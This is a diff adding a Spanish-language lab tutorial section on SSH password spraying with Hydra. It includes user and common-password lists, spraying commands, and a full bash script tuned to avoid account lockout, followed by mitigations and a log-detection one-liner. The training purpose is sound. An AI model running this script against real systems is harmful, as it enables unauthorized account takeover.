@@ -192,7 +192,144 @@ EOF
 hydra -L /tmp/users.txt -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 4
 ```
 
+
 ---
+
+## 🚿 Password Spraying
+
+### ¿Qué es Password Spraying?
+
+**Definición**: Intentar **una contraseña común** contra **muchos usuarios** para evitar bloqueos de cuenta.
+
+**Ejemplo**:
+```
+Usuarios: admin, user1, user2, ..., user1000
+Password: Winter2024!
+Intentos: 1 intento por usuario = 1000 intentos totales
+```
+
+Vs tradicional brute force:
+```
+Usuario: admin
+Passwords: password, password1, password123, ...
+Intentos: 1000 intentos en 1 cuenta → BLOQUEADA
+```
+
+### Ejercicio 4: Password Spraying con Hydra 🌟
+
+#### Escenario
+
+Tienes una lista de usuarios del sistema SSH y quieres probar contraseñas comunes.
+
+#### Paso 1: Crear lista de usuarios
+
+```bash
+cat > /tmp/ssh_users.txt << EOF
+root
+admin
+testuser
+user
+demo
+guest
+support
+service
+backup
+monitor
+EOF
+```
+
+#### Paso 2: Lista de contraseñas comunes
+
+```bash
+cat > /tmp/common_passwords.txt << EOF
+password
+Password1!
+Winter2024!
+Company123!
+admin
+letmein
+welcome
+123456
+changeme
+default
+EOF
+```
+
+#### Paso 3: Password Spraying
+
+**Opción A: Una password a la vez** (recomendado para evitar lockout)
+
+```bash
+# Probar "password" contra todos los usuarios
+hydra -L /tmp/ssh_users.txt -p "password" ssh://ssh-target:2222 -t 1
+
+# Esperar 5 minutos (simular delay real)
+sleep 300
+
+# Probar "Password1!" contra todos
+hydra -L /tmp/ssh_users.txt -p "Password1!" ssh://ssh-target:2222 -t 1
+```
+
+**Opción B: Automatizado con script**
+
+```bash
+#!/bin/bash
+# password_spray.sh
+
+USERS="/tmp/ssh_users.txt"
+PASSWORDS="/tmp/common_passwords.txt"
+TARGET="ssh://ssh-target:2222"
+DELAY=60  # Segundos entre intentos
+
+echo "[*] Iniciando password spraying..."
+echo "[*] Usuarios: $(wc -l < $USERS)"
+echo "[*] Passwords a probar: $(wc -l < $PASSWORDS)"
+
+while read password; do
+    echo ""
+    echo "[+] Probando password: $password"
+    hydra -L "$USERS" -p "$password" "$TARGET" -t 1 -f
+    
+    if [ $? -eq 0 ]; then
+        echo "[!] ENCONTRADA: $password"
+    fi
+    
+    echo "[*] Esperando ${DELAY}s antes del siguiente intento..."
+    sleep $DELAY
+done < "$PASSWORDS"
+
+echo ""
+echo "[*] Password spraying completado"
+```
+
+Ejecutar:
+```bash
+chmod +x password_spray.sh
+./password_spray.sh
+```
+
+---
+
+### Mitigaciones contra Password Spraying
+
+1. **Account Lockout Policies** (pero con threshold alto)
+   - Ej: 10 intentos en 1 hora (no 3 en 5 minutos)
+
+2. **Detección de patrones**
+   - Alertar si muchos usuarios fallan con la misma password
+
+3. **Multi-Factor Authentication (MFA)**
+   - Hace el ataque inútil
+
+4. **Password Policies**
+   - Prohibir contraseñas comunes (usar SecLists para validación)
+
+5. **Monitoring de logs**
+   ```bash
+   # Detectar password spraying en logs
+   grep "Failed password" /var/log/auth.log | \
+     awk '{print $11}' | sort | uniq -c | sort -rn
+   ```
 
 ## 🛡️ Mitigaciones y Defensas
 
